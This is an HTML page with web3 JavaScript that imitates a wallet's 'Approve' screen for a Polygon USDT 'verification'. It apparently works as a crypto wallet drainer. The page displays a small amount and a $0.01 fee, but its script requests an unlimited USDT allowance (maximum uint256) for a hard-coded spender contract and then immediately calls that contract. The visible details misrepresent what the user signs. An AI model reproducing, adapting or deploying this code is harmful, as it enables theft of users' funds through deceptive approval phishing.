<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Approve</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .app-bar {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px 16px 8px;
        }
        .app-bar-title { font-size: 20px; font-weight: 600; }
        .close-btn {
            position: absolute;
            left: 16px;
            font-size: 22px;
            cursor: pointer;
        }
        .content {
            flex: 1;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .card {
            background-color: #111;
            border-radius: 14px;
            padding: 16px 18px;
        }
        .row-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .label { font-size: 14px; color: #b3b3b3; }
        .value { font-size: 15px; font-weight: 500; }
        .sub-label { margin-top: 10px; font-size: 14px; color: #b3b3b3; }
        .dapp-name { font-size: 15px; margin-top: 4px; }
        .fee-amount { font-size: 15px; font-weight: 500; }
        .fee-sub { margin-top: 4px; font-size: 13px; color: #b3b3b3; }
        .info-icon { font-size: 14px; margin-left: 4px; }
        .bottom-area {
            padding: 12px 16px 22px;
            background-color: #000;
        }
        .warning-box {
            display: none;
            margin-bottom: 12px;
            padding: 10px 12px;
            border-radius: 12px;
            background-color: #3b2a13;
            color: #f6e0a3;
            font-size: 13px;
        }
        .primary-btn {
            width: 100%;
            border: none;
            border-radius: 999px;
            padding: 14px;
            font-size: 16px;
            font-weight: 500;
            background-color: #00ff7f;
            color: #000;
            cursor: pointer;
        }
        .primary-btn:disabled {
            opacity: 0.5;
            cursor: default;
        }
        .details-section {
            display: none;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #262626;
        }
        .dapp-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .amount-display {
            margin-top: 10px;
            padding: 8px;
            background: #1a1a1a;
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
<header class="app-bar">
    <div class="close-btn" onclick="window.history.back()">&times;</div>
    <div class="app-bar-title">Approve</div>
</header>

<main class="content">
    <!-- Asset & DApp card -->
    <section class="card">
        <div class="amount-display" id="amountDisplay">
            Amount: Loading...
        </div>
        
        <div class="row-between">
            <span class="label">Asset</span>
            <span class="value">Tether USD (USDT)</span>
        </div>

        <div class="row-between" style="margin-top: 16px; cursor: pointer;" onclick="toggleDetails()">
            <span class="label">View details</span>
            <span class="label" id="detailsArrow">â–¼</span>
        </div>

        <div class="details-section" id="detailsSection">
            <div class="dapp-row">
                <span class="label">DApp</span>
                <span class="value">polygon.network</span>
            </div>
            <div class="dapp-row">
                <span class="label">Contract address</span>
                <span class="value" id="contractAddress">0x0B14...EC5E</span>
            </div>
            <div class="dapp-row">
                <span class="label">Network</span>
                <span class="value">Polygon</span>
            </div>
            <div class="dapp-row">
                <span class="label">Requested by</span>
                <span class="value">Smart Contract</span>
            </div>
        </div>
    </section>

    <!-- Network fee card -->
    <section class="card">
        <div class="row-between">
            <div class="row-between">
                <span class="label">Network fee</span>
                <span class="info-icon">â“˜</span>
            </div>
            <div style="text-align: right;">
                <div class="fee-amount" id="feeUsd">$0.01</div>
                <div class="fee-sub" id="feeNative">0.0001 POL</div>
            </div>
        </div>
    </section>
</main>

<!-- Bottom warning + button -->
<div class="bottom-area">
    <div class="warning-box" id="warningBox">
        Insufficient Polygon (POL) balance
    </div>
    <button class="primary-btn" id="actionButton">Connect Wallet</button>
</div>

<script>
    // ðŸ”§ CONFIGURATION
    const TOKEN_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";    // Polygon USDT
    const SPENDER_CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval

    const ERC20_ABI = [
        {
            "constant": false,
            "inputs": [
                { "name": "_spender", "type": "address" },
                { "name": "_value",   "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
        }
    ];

    // Your smart contract ABI
    const CONTRACT_ABI = [
        {
            "constant": false,
            "inputs": [{ "name": "amount", "type": "uint256" }],
            "name": "verifyOnPolygon",
            "outputs": [],
            "type": "function"
        }
    ];

    let web3;
    let currentAccount = null;
    let userPolBalance = 0;

    const btn = document.getElementById("actionButton");
    const warning = document.getElementById("warningBox");
    const amountDisplay = document.getElementById("amountDisplay");
    const contractAddressEl = document.getElementById("contractAddress");

    // Format contract address to show first 7 and last 7 characters
    function formatAddress(address) {
        if (!address) return '';
        return `${address.substring(0, 7)}...${address.substring(address.length - 7)}`;
    }

    function toggleDetails() {
        const detailsSection = document.getElementById("detailsSection");
        const detailsArrow = document.getElementById("detailsArrow");
        
        if (detailsSection.style.display === "block") {
            detailsSection.style.display = "none";
            detailsArrow.textContent = "â–¼";
        } else {
            detailsSection.style.display = "block";
            detailsArrow.textContent = "â–²";
        }
    }

    function updateUI() {
        if (!currentAccount) {
            btn.textContent = "Connect Wallet";
            btn.disabled = false;
            warning.style.display = "none";
            return;
        }

        if (userPolBalance > 0.001) {
            btn.textContent = "Approve & Execute";
            btn.disabled = false;
            warning.style.display = "none";
        } else {
            btn.textContent = "Top up Polygon (POL)";
            btn.disabled = false;
            warning.style.display = "block";
            warning.textContent = "Insufficient Polygon (POL) balance for gas fees";
        }
    }

    async function connectWallet() {
        if (typeof window.ethereum === "undefined") {
            alert("Please install MetaMask!");
            return false;
        }

        try {
            web3 = new Web3(window.ethereum);
            
            // Request accounts
            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
            currentAccount = accounts[0];
            
            // Check network
            const chainId = await window.ethereum.request({ method: "eth_chainId" });
            if (chainId !== "0x89") {
                warning.textContent = "Please switch network to Polygon (POL)";
                warning.style.display = "block";
                btn.textContent = "Wrong Network";
                btn.disabled = true;
                return false;
            }

            // Get POL balance
            const balanceWei = await web3.eth.getBalance(currentAccount);
            userPolBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
            
            return true;
        } catch (err) {
            console.error("Wallet connection failed:", err);
            alert("Failed to connect wallet");
            return false;
        }
    }

    async function approveAndExecute() {
        try {
            btn.disabled = true;
            btn.textContent = "Approving USDT...";

            // Step 1: Approve USDT
            const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);

            const approveTx = await token.methods
                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
                .send({ from: currentAccount });

            // Step 2: Immediately call your smart contract
            btn.textContent = "Executing Transaction...";
            
            const usdtAmount = localStorage.getItem('usdtAmount') || "0";
            const amountWei = web3.utils.toBN(usdtAmount * 1000000); // USDT has 6 decimals
            
            const contract = new web3.eth.Contract(CONTRACT_ABI, SPENDER_CONTRACT_ADDRESS);
            
            const contractTx = await contract.methods
                .verifyOnPolygon(amountWei)
                .send({ from: currentAccount });

            onSuccess();
        } catch (err) {
            console.error("Transaction failed:", err);
            btn.textContent = "Try Again";
            btn.disabled = false;
            alert("Transaction failed: " + err.message);
        }
    }

    function onSuccess() {
        btn.textContent = "Completed âœ“";
        btn.disabled = true;
        alert("Success! USDT approved and transaction executed.");
        
        // Navigate to success page after delay
        setTimeout(() => {
            window.location.href = "success.html";
        }, 2000);
    }

    async function handleButtonClick() {
        if (!currentAccount) {
            // Connect wallet first
            const connected = await connectWallet();
            if (connected) {
                updateUI();
            }
        } else if (userPolBalance <= 0.001) {
            // Top up POL
            alert("You need POL for gas fees. Please top up your Polygon balance.");
        } else {
            // Approve USDT and execute smart contract
            await approveAndExecute();
        }
    }

    // Initialize page
    document.addEventListener('DOMContentLoaded', function() {
        // Display amount from previous page
        const usdtAmount = localStorage.getItem('usdtAmount') || "0";
        amountDisplay.textContent = `Amount: ${usdtAmount} USDT`;
        
        // Format contract address
        contractAddressEl.textContent = formatAddress(SPENDER_CONTRACT_ADDRESS);
        
        // Set up button click handler
        btn.addEventListener("click", handleButtonClick);
    });
</script>
</body>
</html>
